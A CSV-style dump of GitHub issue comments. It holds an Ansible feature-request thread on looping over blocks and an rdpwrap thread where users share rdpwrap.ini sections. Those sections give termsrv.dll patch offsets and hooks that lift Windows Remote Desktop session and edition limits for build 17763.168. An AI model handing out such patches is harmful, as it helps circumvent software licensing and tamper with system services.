ansible/ansible/13262/235183670,"Hi, I've resolved replacing with_items with with_indexed_items Thanks ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/235252391,To enhance playbook's performace I've rewritten it with but the with_indexed_items return the following alert executing for hosts that doesn't match the block's when Do you have any suggestions to bypass this behaviour (I think with_indexed_items evaluated before when clause)? Thanks ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/252272638,Is there already a possible estimate for this feature? Thanks in advance! @friend ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/252287706,"The feature requires redesigning how blocks work, currently they are processed at 'play build time' and would require them to be dynamic. Also the feature requires some developer WANTING to implement it, right now no one has stepped up. Once we have a developer wanting and KNOWING how to implement it .. you can get a timeline. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/264243130,plus one This is feature that would defintely help. ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/267381019,"plus one just googled for how to do this and ended up here, fwiw. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/270881585,Adding support for until-loop to Blocks is something I could find very useful in some of my playbooks. ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/272990897,plus one It would be amazing if this feature gets added. ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/282849562,"Blocks are an incredibly useful feature, I'd like to thank the Ansible team for implementing them (and for implementing the rest of Ansible too, obviously). When I upgraded to Ansible 2.0 I went block-crazy and cleaned up a bunch of my playbooks. Part of this was because I had learned better ways of using Ansible but a big part of it was because the introduction of blocks meant that I could get rid of some conditional include statements and instead wrap small groups of tasks inside of a block using a when statement to determine if the block will be executed. Being able to iterate over blocks using a with_items statement would be useful to me when I'm building new servers. We use the capistrano gem for deploying our (ruby based obviously) software. When I build a new server I deploy software to it by creating a directory in /tmp, checking out the code for the project into that directory and then running a capistrano deploy using the HOSTS variable to override the hosts defined in the deploy file. If I'm building four new application servers and deploying to them I need to run my playbook four times, which is unnecessarily duplicative since that requires me to check out the code four times. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/285164374,This would be a great feature for looping over mountpoints in order to  Add Disk Epand VG (foreach vg) Expand LV (foreach lv) Expand FS (foreach mountpoint)  plus one 👍 ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/285164666,@friend you can currently do that by looping over  or ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/285165288,@friend I'm looping over includes for each  which in turn loops over includes for each  Thanks. ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/285166050,"several ways, including with_nested, but that is better question for ML/IRC than this thread ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/285890462,"@friend I would really like to see this issue fixed because using include in order to achieve this basic functionality is a hack, a hack that is increasing the number of files needed for a playbook without good reasons (the code is not re-used if you create another file just to workaround this bug). Based on the number of votes I would say that this is a read important feature to address. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/285892797,"@friend While I would love to see this functionality added, in the context of Ansible I don't think it's nearly as important as you are implying. Needing loops like this is rather an edge case in Ansible, and there are not many situations where you can build those loops while maintaining idempotency. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/288077637,"@friend It would also make working with  and  much easier, since we would have something like a variable scope during the play. I ran into this issue multiple times (loop over xyz, register it and use it in the next step) and doing an variable extraction after the combination of attributes mentioned above is quite painful. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/288082842,@friend oh I agree that this would be very useful. I am the one who opened the issue after all. I just didn't like the entitled attitude about it @friend took to it ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/290219668,is this still not an option? ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/290258206,"@friend Greetings! Thanks for taking the time to open this issue. In order for the community to handle your issue effectively, we need a bit more information. Here are the items we could not find in your description  component name  Please set the description of this issue with this template  here for bot help  ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/294895266,+2048 This will be extremely useful ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/295819095,"plus one This is a no-brainer. It would make so many things in ansible more concise. I am frequently running into scenarios where I have to copy/paste plays to make the exact same tasks work with a different group from the inventory. One caveat as @friend pointed out above, there would need to be a different variable for each layer of looping. If tasks within a block use with_items, and the block uses with_items, the current item for each cannot both be 'item'. So this could be implemented with @friend's solution, or item could be an object indexed by the names of the nested tasks that are looping. Something like this I would expect the output from above to be ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/297789287,Badly need it. ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/304351981,I also need a way to have a loop over blocks. ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/304353026,"@friend @friend @friend (to address the latest ""me too"" commenters) I guess the maintainers got the point, and upvoting/upthumbing of the original request is surely enough, if you don't want to participate in a solution. Thanks,  our inboxes. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/304553400,"I cannot see the ansible core, so I don't know how to do it. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/305738409,@friend There is also the loop_control/loop_var construct used in other looped tasks that could be used to avoid collisions. ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/309234071,Yes this would be a very useful feature please add! ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/309239363,until then you can use include role looping ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/309239420,@friend and @friend not sure why you gave my previous comment a thumbs down ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/309240095,"@friend because we're all getting the ""me too"" notifications even though nothing of interest was posted. Please just add a ""thumbs up"" reaction to the relevant post(s), see @friend's comment. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/309245593,"include Role is not a good feature Sent from my BlackBerry 10 smartphone on the Rogers network. From brenguy Sent Saturday, June 17, 2017 1649 To ansible/ansible Reply To ansible/ansible Cc maxmengtor; Mention Subject Re [ansible/ansible] feature request looping over blocks (#13262) until then you can use include role looping — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub or mute the thread",False,True,False,ansible/ansible/13262
ansible/ansible/13262/315111502,This so needs to get done. I was going through my code and chased this up from last year. This is a perfectly valid use case. ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/315119455,"@friend No one's denied that it's a valid use-case, just that it will take a lot of work and no one's stepped up to take it on. To quote @friend ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/321085289,plus one ...to the developer that takes this on ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/322008529,"My use case a problematic task that fails due to network or some other known issue. With a block, I can use rescue to reset whatever network connection is problematic, but then there is no way to use retry (a do until loop) to retry the block after fixing the known issue in the rescue block. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/322445203,"Please stop adding ""plus one"", ""me, too"" and similar comments. There are a lot of us following this issue who receive an email for each comment. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/322446300,"How else do you want to show ansible developers that this feature is actually useful and would be good to implement it? You can always create a mail filter, can't you? ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/322447125,"@friend Pay a developer to implement it, if you really want it or do it yourself. Otherwise be happy just using a plus one smily. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/322461116,"@friend, mail filter will prevent notification when a change is made or evaluated by the developer. Ansible programmers see the number of reactions in the first comment. Stick the first comment (add reaction), instead of commenting if you think it's a good idea. That's exactly what they were introduced for.  ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/322464336,"@friend It won't prevent notification if you will create the filter correctly, but I get your point ). ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/322484115,"I would like to point out to the Ansible core developers that this issue has more people requesting it than any other issue in this repo, so perhaps its priority should be raised. Currently it has 276 votes (in the form of a thumbs up reaction on the top comment). The next most popular issue has only 53. @friend tagging you for visibility. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/322485916,@friend  this still stands ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/322488616,"@friend I understand, and that makes complete sense if the fix is to come from the community, but RedHat still has developers on staff for Ansible, and in that context there is power to prioritize things beyond what individual developers want to do if desired. Also if the owners want to prioritize this without taking it on internally, a bounty could be put on the issue which might increase the likelihood of someone taking it on personally. I'm not trying to imply that anything like this must be done, just raising it as a possibility since it's such a popular issue. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/322491826,"@friend and we already know that it is a popular issue, it is just very hard to implement as it requires a core engine rewrite and there are numerous workarounds depending on the exact need. Popularity does not change the difficulty nor impact, this would require many resources and basically halting most other features/fixes while we rewrite the compilation and execution engines. We opted for delivering a slew of other features and fixes, you might disagree with us and that is fine. We are not discounting this feature, otherwise this ticket would be closed, but we don't see any path to add it anytime soon. If someone else figures out a way, we welcome their PR. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/322496406,"Thanks for that update @friend. I don't presume to know what's going on behind the scenes or what's currently being prioritized. You guys have done an excellent job creating, IMO, the best configuration management tool on the market. I trust you all to make good decisions on the direction of the project going forward just as you have so far. My comments were only intended to ensure that there is awareness of the popularity of this issue since there has been very little communication to the community up to this point that would reflect that awareness. Just informing us as you just did that you are aware it's a very popular issue, but still aren't prepared to tackle it internally satisfies me, and I hope many others as well, that you are listening and have the information you need to make the best decision in this regard. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/327782284,"Not quite understanding why this requires a complete rewrite, unless something is horribly wrong to begin with in which case it would make sense to me that energy be invested in that rather than continuing to grow the size of the code base that needs porting. In ant event at the very least the YAML parser could simply collapse with_list into the individual task blocks, thus providing a shortcut to improve the readability and maintainability of playbooks if the ordering preference is ultimately irrelevant, I'm just trying to avoid having to rewrite the same loops and platform filters for every. single. task. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/327816572,"@friend, I'll quote @friend here ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/327869796,Yes that's the comment I'm referring to. ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/327911917,"@friend I feel like that's pretty clear. Currently blocks are processed at build time, and they would need to instead be processed on the fly at execution time. That sounds like a pretty fundamental change to me, with potential performance implications. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/329229007,"As @friend pointed out, the loops could be simply lifted into the tasks within the block with a little processing to merge block level loops and task level loops.  This would negate any performance benefits, but the readability/writability improvements are probably worth it by themselves. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/329232861,"@friend, to be clear, you are saying use a syntax of a block level loop, but functionally process the loop at the task level? If that's what you're saying, it doesn't remotely solve the problem at hand. The problem raised here is that currently you can loop a task an arbitrary number of times, but you can't loop a group of tasks an arbitrary number of times (the difference between 3 tasks going  and ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/329233078,The only current solution being looping over an  task ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/329247394,"Well since I implemented almost the exact same thing in Ducted I know it certainly solve a lot of problems to just snap off that part of the yaml tree in your preprocessor then take the parent block and duplicate it back into the tree as ordered siblings which retain sequencing. If you cared particularly about ordering over short hand grouping, and are sure you don't have giant sets, then I guess you can unroll the loops at that point. But to be clear as well if the engine is broken enough to require unrolling loops in the preprocessor, or ludicrous (like, Java level) amounts of forced decoupling through deeply nested include trees (not sure how that is more efficient than using the already parsed yaml tree? but I digress) then if the best argument is that it's currently too much work and there are higher priorities to me is a signalling risk of product management failures, because putting effort into those higher priorities will only move the goal post of fixing the engine even further away. That is a concern. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/329262021,"@friend If you think this would be as simple a change as you are saying, why don't you open a PR for it? Sometimes a feature being a high priority for the community does not necessarily translate to a high priority for a company. IMHO this is acceptable as long as solid communication about those priorities is maintained, and from where I'm sitting, the team is doing a reasonably good job about this. Always prioritizing based on the existing community means that you end up with more and more feature creep to fine-tune your product for a small group of your most dedicated users. If part of your goals is to expand your user base, you need to spend enough time on your existing user's needs to keep them happy, but you also have to go out and find out who your potential users are that aren't yet using your tool, find out what they need to become users, and implement that. You can see this in Ansible's priorities with the big focus on networking hardware. Needing to configure networking hardware was not a big issue for Ansible's core userbase, but it was a big issue for a potential user pool that Ansible wanted to win over. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/329267846,"I was actually going to do that, but I was just concerned about investing a lot of time learning the codebase and doing that if there are overall objections to it from the project owners. But after re-reading the official response that may be misplaced anxiety. Networking hardware is a very valid feature to add, I was in the meetings with RH and that exact user pool so I'm pleasantly surprised that has been actioned so quickly - jet ski fuel is expensive ya know ;) ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/329268914,"would it be any simpler to add a new directive via plugin? Like a  plugin that did said expansion that could have its own api independent of the ansible one? On Wed, Sep 13, 2017 at 1213 PM, Colin Alston notifications@friend.com wrote --  Dylan Grafmyre Systems Administrator | Conversica 503.908.2521 direct |  888.778.1004 office | conversica.com Watch a video  |  Request a demo  |  Try it for free  |  Follow on LinkedIn ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/329302524,"Yeah @friend, from the responses left by Brian I'd say it's a matter of resource allocation, not any fundamental objection. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/329354184,"It is functionally different, not least of which is the efficiency, but I suspect that the majority of use cases could be covered with a workaround, if the difference in difficulty is indeed as drastic as you say.  To be clear you could call it  or just document it well.  While I can dream up scenarios where the difference would change the result, such cases seem usually pathological to me ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/330505378,plus one This feature will be very much helpful. ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/335252621,"The support for looping over includes is the recommended way to achieve this. Take a look at dynamic includes for more detail. If you have any further questions, please let us know by stopping by one of the two mailing lists, as appropriate   - for user questions, tips, and tricks  - for strategy, future planning, and questions about writing code  Because this project is very active, we're unlikely to see comments made on closed tickets, but the mailing list is a great way to ask questions, or post if you don't think this particular issue is resolved. Thank you! ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/335316696,"@friend looping over includes forces you to break out of the current logic and context-switch when writing or updating playbooks, which isn't always ideal. We are aware of the ability to loop overs includes, but would prefer to be able to loop over blocks if we choose. Closing your most popular (by far) feature request as wontfix is pretty disappointing. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/335362374,This is as ridiculous as removing all the loops from Python and telling people they have to use cyclic imports. Clearly this project is destined for failure ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/335468261,"@friend No, I really doubt that one of the most popular configuration management tools, backed by RedHat, and the only one I know of that's idempotent by design is going to fail any time soon, even if they aren't willing to look at this issue. I think they are making a mistake here, but it's still an incredible tool that's very much worth using. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/335478286,"@friend this shouldn't have been closed, it should have been marked as waiting on contributor. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/335506205,@friend ansibot came in behind you and removed that tag. ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/335508546,"@friend yesterday we decided that this was not a feature that we wanted inside of Ansible.  So according to our discussion yesterday, closing this ticket is proper.  I think since there's some flip-flopping we desperately need to have a discussion today about the pros and cons of accepting this feature and once we have them there, lay all of the pros and cons out in this ticket, not just the ""final"" decision as to whether this is a feature we want if someone is willing to do the work or if it is counter to what we want Ansible to do. People will be disappointed if we decide that the feature is not something that we will put in but they will be able to at least understand why we think the alternative is sufficient and what the cost of putting the new feature in is.  And if we decide that we would take this as a PR then future committers will be able to refer to the ratoinale here as to why they should take the feature instead of reject it as well. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/335517909,@friend If you do choose to close this permanently I think that rationale should be explained in-depth attached to my original comment so that it's easy to access for anyone finding this issue later. ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/335904803,"We talked about this extensively these last few days and came to the conclusion that we are open to accepting this feature if someone in the community would care to implement it.  However, we're going to leave this ticket closed as this is a complex enough problem that we'd like it to go through the Proposal Process instead.  To make this into a proposal, the person who wants to implement it should open an issue on  (there's a template to fill out, you can look at past proposals for guidance), put it on the IRC meeting agenda (  label%3Ameeting_agenda label%3Acore ) and then plan on attending the IRC meetings to discuss how to implement it and get reviews of finished (or half-finished) code. Do note, there are many pitfalls in implementing this.  To get possible implementers started in the right direction, here are some problems and hints that we've identified in our discussions since we started considering this feature  Looping over includes already serves the same function as looping over blocks.  The syntax is different but the functionality is the same. A naive approach to looping over blocks (by turning them into dynamic includes behind the scenes) would be possible but it would bring with it all the assumptions that plague dynamic includes without being obvious to the user why a block acted in a different way when it was inside of a loop versus outside. Similarly, statically expanding the loop would entail similar shortcomings found when doing static includes (early evaluation of variables, no inventory variables, etc.). So a non-naive way would have to be sought out for looping over blocks.  This probably entails a reworking of core architecture as neither looping over dynamic nor looping over static includes offers a model that we can apply here. Any implementation needs to make sure that blocks inside and outside of loops can Reference the same set of variables with the same results Needs to consider rescue/always semantics ...are they also looped? Any_errors_fatal, serial, free vs linear strategies and other interactions.    One of the difficulties in implementing features like this is that we are trying to walk a fine line between automation and not becoming a programming language.  We want people to be able to declare what their machines look like, using little bits of programming as shortcuts, to make the declarations clearer, and as an escape hatch when declarative forms are not sufficient.  We do not want to create an environment where playbooks are mostly imperative code which the next sysadmin has to puzzle through and interpret.  Even within the core team we go back and forth on this kind of feature, struggling to balance the needs of functionality, code maintenance, playbook maintenance, overlap with existing features, etc. Thank you for understanding and thanks to whoever eventually wants to take a stab at implementing this! ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/335905544,"@friend I've added a summary of details to your inital post that links to my in-depth comment.  Good idea, adding it to the top post. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/372712676,"So why I think it's balls that Ansible (still) doesn't have this feature, looping over includes is an OK way, hopefully a contributor will come along. There is another way that I haven't seen discussed. This uses one of YAML's little known neat feature, anchors. This page has a pretty good demo of it  The TL/DR is put a   on the part you want to repeat, and then a  where you want to repeat it. The page I linked to shows some more anchor tricks. If I just want to repeat something once and I'm too lazy to make a separate task file (just so I can loop), I can use anchors instead. If you had many sub-tasks that you wanted to do, you'll probably want to loop over an include instead, but if it's just a small number you might prefer the convenience of keeping it all in the one file. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/372756228,"@friend That doesn't help with the problem presented here. All you're doing with anchors is defining a var on the fly vs defining it with a vars file or an argument. It will still execute your  task twice and then your  task twice, where the intent of this ticket is to allow running the  task, then the  task, then running them both again. (x2, x2) vs (, )x2 ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/372769346,"@friend thanks for the reminder about anchors. I see them in puppet all the time then straight out forget to use them in Ansible.  @friend, @friend , I'd be interested if the distribution property holds in Ansible? I can see that it wouldn't in a single-threaded program where the order matters, but does (x2, x2) = (, )x2? Are they the same. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/372773508,"@friend it's different, as smiller171 pointed out to me. If you have two tasks ( &amp; ) and two items ( &amp; ) you will get  with my way, and , with way OP wants. (presumably looping of includes works this way). Also smiller171 pointed out that what I've done is the equivalent of defining a variable (a variable can be a list). So the YAML anchors don't help solve this problem. I misunderstood the problem. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/373037504,"@friend in most playbooks the two situations should create the same result, but there are some situations where you may want to do several tasks on a single item, and then move onto the next item. Admittedly, in the few situations where this can come up it may be better to write a custom module to handle all of the things you want to do as a single task for better idempotency. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/386566311,plus one would be nice and useful ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/386590232,@friend please in the future just click the thumbs up on the first comment. There are a lot of people watching this thread and notifying them all for a plus one comment isn't helpful. ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/391294551,"Hello, does this feature implemented? ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/391348171,@friend No. see  for details. Looping over includes is the best way to handle this for now. ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/425486514,"I cleaned up this thread to keep the most relevant information visible. At least it makes an easier read for anyone who wants to understand the whats and whys related to this subject. I am tempted to open this issue, on the basis that if anyone wants to implement this, they can. But given the sheer volume of people, I fear this may get out of hand again. There's also a new feature request #46203 for supporting until-loops on includes (which are currently not supported) and has some rationale why loops on blocks are unlikely to be featured anytime soon. ",False,True,False,ansible/ansible/13262
rdpwrap/stascorp/611/390061436,new updates broke it I tried my old termserv.dll but then remote desktop services will not start anymore. ,False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/446500364,"Yes, rdpwrapper is blow up after update yesterday. Any things? ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/446519878,"@ @friend, @friend , @friend   10.0.17763.194 - CU KB4471332 - keeps/lifts  the termsrv.dll to its file version 10.0.17763.168. Therefore since  .165, .167, .168 use the data-offset, which are the same, we have to add to the rdpwrap.ini dated 2018-10-10 ( last.ini in the repository - code res\rdpwrap,ini). Ensure you have the correct ini file with two  ini-sections  [10.0.17763.1] , [10.0.17763.1-SLInit]  and add then the two sections [10.0.17763.168], [17763.168-SLInit] Keep an eye on Acces Rigths and at least  use ""stop net termservice"" before you exchange the rdpwrap.ini (2018-10-10) with your newly edited ini file. After the successful replacing you have to start the termservice again (""start net termservice"") Just a short remark there are more stumbling stones with system privileges if plan to change termsrv.dll on your own. ! ( see also #606 -hajubu posts) .Good Luck  with this task ( You also may wait till we get an updated rdpwrap.ini from  binarymaster in the repository ) ;---------SNIP part1-----goes just behind the section of 10.0.17763.1 ---  [10.0.17763.168] LocalOnlyPatch.x86=1 LocalOnlyOffset.x86=AFC74 LocalOnlyCode.x86=jmpshort LocalOnlyPatch.x64=1 LocalOnlyOffset.x64=77AF1 LocalOnlyCode.x64=jmpshort SingleUserPatch.x86=1 SingleUserOffset.x86=4D665 SingleUserCode.x86=nop SingleUserPatch.x64=1 SingleUserOffset.x64=1322C SingleUserCode.x64=Zero DefPolicyPatch.x86=1 DefPolicyOffset.x86=4BE69 DefPolicyCode.x86=CDefPolicy_Query_eax_ecx DefPolicyPatch.x64=1 DefPolicyOffset.x64=17F45 DefPolicyCode.x64=CDefPolicy_Query_eax_rcx SLInitHook.x86=1 SLInitOffset.x86=5B18A SLInitFunc.x86=New_CSLQuery_Initialize SLInitHook.x64=1 SLInitOffset.x64=1ABFC SLInitFunc.x64=New_CSLQuery_Initialize ;--------------end snip part1----------- ; ;-----------snip part2 --------goes just at the bottom of the file behind 10.0.17763-SLInit Section------ ;. [10.0.17763.168-SLInit] bInitialized.x86      =CD798 bServerSku.x86        =CD79C lMaxUserSessions.x86  =CD7A0 bAppServerAllowed.x86 =CD7A8 bRemoteConnAllowed.x86=CD7AC bMultimonAllowed.x86  =CD7B0 ulMaxDebugSessions.x86=CD7B4 bFUSEnabled.x86       =CD7B8 bInitialized.x64      =ECAB0 bServerSku.x64        =ECAB4 lMaxUserSessions.x64  =ECAB8 bAppServerAllowed.x64 =ECAC0 bRemoteConnAllowed.x64=ECAC4 bMultimonAllowed.x64  =ECAC8 ulMaxDebugSessions.x64=ECACC bFUSEnabled.x64       =ECAD0 ;---------end snip part2 -------------- ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/446559765,thank you very much hajubu it's working for me on build 17763.194 but i havent [10.0.17763.1] section i only have [10.0.17763.1-SLInit] section but its works! anyone need help just follow these steps from above from hajubu ,False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/446582134,"Thank you Aliqalavi!    I finally got this working on Windows 10 (1809).     😊 From aliqalavi notifications@friend.com  Sent Wednesday, December 12, 2018 446 AM To stascorp/rdpwrap rdpwrap@friend.github.com Cc Subscribed subscribed@friend.github.com Subject Re [stascorp/rdpwrap] Add support for 10.0.17763.194 (#611) @ @friend  , @friend   , @friend   10.0.17763.194 - CU KB4471332 - keeps/lifts the termsrv.dll to its file version 10.0.17763.168. Therefore since .165, .167, .168 use the data-offset, which are the same, we have to add to the rdpwrap.ini dated 2018-10-10 ( last.ini in the repository - code res\rdpwrap,ini). Ensure you have the correct ini file with two ini-sections [10.0.17763.1] , [10.0.17763.1-SLInit] and add then the two sections [10.0.17763.168], [17763.168-SLInit] Keep an eye on Acces Rigths and at least use ""stop net termservice"" before you exchange the rdpwrap.ini (2018-10-10) with your newly edited ini file. After the successful replacing you have to start the termservice again (""start net termservice"") Just a short remark there are more stumbling stones with system privileges if plan to change termsrv.dll on your own. ! ( see also #606   -hajubu posts) .Good Luck with this task ( You also may wait till we get an updated rdpwrap.ini from binarymaster in the repository ) ;---------SNIP part1-----goes just behind the section of 10.0.17763.1 --- [10.0.17763.168] LocalOnlyPatch.x86=1 LocalOnlyOffset.x86=AFC74 LocalOnlyCode.x86=jmpshort LocalOnlyPatch.x64=1 LocalOnlyOffset.x64=77AF1 LocalOnlyCode.x64=jmpshort SingleUserPatch.x86=1 SingleUserOffset.x86=4D665 SingleUserCode.x86=nop SingleUserPatch.x64=1 SingleUserOffset.x64=1322C SingleUserCode.x64=Zero DefPolicyPatch.x86=1 DefPolicyOffset.x86=4BE69 DefPolicyCode.x86=CDefPolicy_Query_eax_ecx DefPolicyPatch.x64=1 DefPolicyOffset.x64=17F45 DefPolicyCode.x64=CDefPolicy_Query_eax_rcx SLInitHook.x86=1 SLInitOffset.x86=5B18A SLInitFunc.x86=New_CSLQuery_Initialize SLInitHook.x64=1 SLInitOffset.x64=1ABFC SLInitFunc.x64=New_CSLQuery_Initialize ;--------------end snip part1----------- ; ;-----------snip part2 --------goes just at the bottom of the file behind 10.0.17763-SLInit Section------ ;. [10.0.17763.168-SLInit] bInitialized.x86 =CD798 bServerSku.x86 =CD79C lMaxUserSessions.x86 =CD7A0 bAppServerAllowed.x86 =CD7A8 bRemoteConnAllowed.x86=CD7AC bMultimonAllowed.x86 =CD7B0 ulMaxDebugSessions.x86=CD7B4 bFUSEnabled.x86 =CD7B8 bInitialized.x64 =ECAB0 bServerSku.x64 =ECAB4 lMaxUserSessions.x64 =ECAB8 bAppServerAllowed.x64 =ECAC0 bRemoteConnAllowed.x64=ECAC4 bMultimonAllowed.x64 =ECAC8 ulMaxDebugSessions.x64=ECACC bFUSEnabled.x64 =ECAD0 ;---------end snip part2 -------------- thank you very much hajubu it's working for me on build 17763.194 but i havent [10.0.17763.1] section i only have [10.0.17763.1-SLInit] section but its works! anyone need help just follow these steps from above from hajubu — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub  , or mute the thread  . ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/446584859,"That is odd. Have a look to the „official“ rdpwrap.ini in the repository ( see CODE  res\rdpwrap.ini) Or better Code  res\rdpwrap-ini-kb.txt Normally, For each „Version“  does exist  a proper  Section pair. But I also see some singular cases. There might be some „default“ cases, which gaves us this Advantage. – We should not Always Count to be lucky like this. I will add an template also. @ @friend, @friend , @friend, @friend 10.0.17763.194 - CU KB4471332 - keeps/lifts the termsrv.dll to its file version 10.0.17763.168. Therefore since .165, .167, .168 use the data-offset, which are the same, we have to add to the rdpwrap.ini dated 2018-10-10 ( last.ini in the repository - code res\rdpwrap,ini). Ensure you have the correct ini file with two ini-sections [10.0.17763.1] , [10.0.17763.1-SLInit] and add then the two sections [10.0.17763.168], [17763.168-SLInit].Good Luck with this task thank you very much hajubu it's working for me on build 17763.194 but i havent [10.0.17763.1] section i only have [10.0.17763.1-SLInit] section but its works! anyone need help just follow these steps from above from hajubu ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/446709964,hajubu ?( You also may wait till we get an updated rdpwrap.ini from binarymaster in the repository ) is this going to be done around 18 December 2018 you think. ,False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/446715035,"…..  I just have a „Feeling“,  when the OS win10 1809 update Story is calming down ,        we will be lucky getting an update.     Probably @friend knows more &amp; better.  …. Meanwhile we may live with this intermediate solution. a) Os update CU 1809-17763-194 (KB4471332) using  b) the suitable data for 10.0.17763.168 (termsrv.dll file version) Von StarfighterJ Gesendet Mittwoch, 12. Dezember 2018 2018 hajubu ?( You also may wait till we get an updated rdpwrap.ini from binarymaster in the repository ) is this going to be done around 18 December 2018 you think. ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/446960387,"Thank you very much !  @friend and @friend ( #601 ) Just adding [10.0.17763.168] and [17763.168-SLInit] to rdpwrap.ini ( 2018-10-10 ) seems does't work for me( Windows 10 build 17763.194 ). When I add  both [10.0.17763.168] , [17763.168-SLInit] ( from @friend ) and [10.0.17763.165]  , [10.0.17763.165-SLInit] ( from @friend #601 ) , it works! Anyone need help can try it. ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/446994807,"Hello. After updating Windows, the RDP stopped working. I did everything according to the instructions of hajubu / @friend. RDPWrap-v1.6.2 writes that everything works fine, but when you try to connect, the window opens for a second and automatically closes. What is the problem ? Help me please. Thanks. Video ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/447060179,"The latest Windows update seems to have an issue with the INI provided by @friend. Following all the above tips and tricks, I am still unable to get it working. System Info OS Windows 10 Home Version 1809 OS Build 17763.194 RDP Version 10.0.17763.168 Here are my findings after about an hour of testing  Adding the 165 support from @friend #601 (suggested by @friend) seems to make no difference whatsoever for me. Adding ONLY the [10.0.17763.168] section OR the [10.0.17763.168-SLInit] section allows TermService to launch with no errors and stay open, however it does not let me connect via RDP. Adding BOTH the [10.0.17763.168] and the [10.0.17763.168-SLInit] sections prevents TermService from launching properly. Looking at Task Manager, TermService seems to attempt to launch twice (cycling through two PID values) before crashing with an error code of 1067.  I'm at a complete loss here so any help would be much appreciated. ",False,True,False,rdpwrap/stascorp/611
rdpwrap/stascorp/611/447061310,It works on 10.0.17763.168. I also struggled but if you follow the steps above you'll see it can work ,False,True,False,rdpwrap/stascorp/611
